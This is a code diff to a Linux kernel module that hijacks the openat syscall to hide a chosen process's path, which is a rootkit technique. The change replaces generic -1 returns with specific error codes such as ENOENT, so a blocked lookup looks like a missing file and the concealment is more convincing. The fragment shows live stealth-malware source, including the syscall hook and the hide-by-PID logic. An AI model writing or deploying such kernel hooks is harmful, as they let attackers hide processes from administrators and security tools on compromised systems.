@@ -33,7 +33,7 @@ int new_openat(const struct pt_regs *regs) {
     // If the target is contained within/is the path we're trying to hide, return an error.
     if (strstr(path, path_to_hide) != NULL) {
         kfree(path);
-        return -1;
+        return -ENOENT;
     }
 
     kfree(path);
@@ -49,7 +49,7 @@ int load(void) {
     pr_info("Initializing...");
     if (pid_to_hide == NULL) {
         pr_warn("Pid to hide has not been set! Exiting...");
-        return -1;
+        return -EINVAL;
     }
 
     path_to_hide = kmalloc(PATH_MAX, GFP_KERNEL);
@@ -57,7 +57,7 @@ int load(void) {
 
     unsigned long openat_ptr = hijack_syscall(__NR_openat, (unsigned long)new_openat);
     if (!openat_ptr) {
-        return -1;
+        return -ENXIO;
     }
 
     original_openat_ptr = (original_openat_t)openat_ptr;
